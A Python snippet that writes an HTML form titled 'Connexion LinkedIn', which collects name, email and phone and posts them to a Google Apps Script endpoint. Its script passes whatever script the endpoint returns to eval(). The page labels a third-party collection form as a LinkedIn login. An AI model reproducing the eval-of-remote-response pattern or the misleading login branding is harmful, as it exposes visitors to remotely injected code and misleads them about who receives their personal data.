# Création du contenu HTML du formulaire stylé avec redirection vers Apps Script
html_code = """
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connexion LinkedIn</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
    }
    .form-container {
      max-width: 500px;
      margin: 50px auto;
      background: white;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.05);
    }
    label {
      display: block;
      margin-top: 16px;
      margin-bottom: 6px;
      font-weight: bold;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #3b82f6;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #2563eb;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <form id="linkedinForm">
      <label for="prenom">Prénom :</label>
      <input type="text" id="prenom" name="prenom" required />

      <label for="nom">Nom :</label>
      <input type="text" id="nom" name="nom" required />

      <label for="email">Email :</label>
      <input type="email" id="email" name="email" required />

      <label for="phone">Téléphone :</label>
      <input type="text" id="phone" name="phone" required />

      <button type="submit">Valider et continuer vers LinkedIn</button>
    </form>
  </div>

  <script>
    document.getElementById("linkedinForm").addEventListener("submit", async function(e) {
      e.preventDefault();
      const form = e.target;
      const formData = new FormData(form);

      const url = "https://script.google.com/macros/s/AKfycbxYg8BxdXMWN7DMpiVeEw_RpcPbVRlAzoNbd7tFdacD_N7l1FGiw-oQrkngnrmGI70_/exec";

      try {
        const response = await fetch(url, {
          method: "POST",
          body: formData
        });

        const html = await response.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");
        const script = doc.querySelector("script");

        if (script) {
          eval(script.innerText);
        } else {
          alert("Connecté, mais pas de redirection.");
        }
      } catch (error) {
        console.error("Erreur :", error);
        alert("Erreur d'envoi. Réessaye.");
      }
    });
  </script>
</body>
</html>
"""

# Enregistrement dans un fichier HTML
file_path = "/mnt/data/form_linkedin_ruben.html"
with open(file_path, "w", encoding="utf-8") as f:
    f.write(html_code)
